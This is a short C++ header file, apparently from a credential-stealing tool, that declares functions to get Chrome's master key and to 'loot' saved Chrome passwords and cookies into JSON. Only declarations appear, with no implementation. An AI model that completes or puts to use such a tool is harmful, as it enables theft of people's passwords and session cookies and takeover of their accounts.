#ifndef LOOT_HPP
#define LOOT_HPP

#include <string>
#include "../libs/nlohmann/json.hpp"

using json = nlohmann::json;

const int MASTER_KEY_SIZE = 32;

void getMasterKey(unsigned char* masterKey, std::string userName);
json lootChromePasswords(const unsigned char* masterKey, std::string userName);
json lootChromeCookies(const unsigned char* masterKey, std::string userName);

// Utilities
void printUCharAsHex(unsigned char* uChar, int len);

#endif
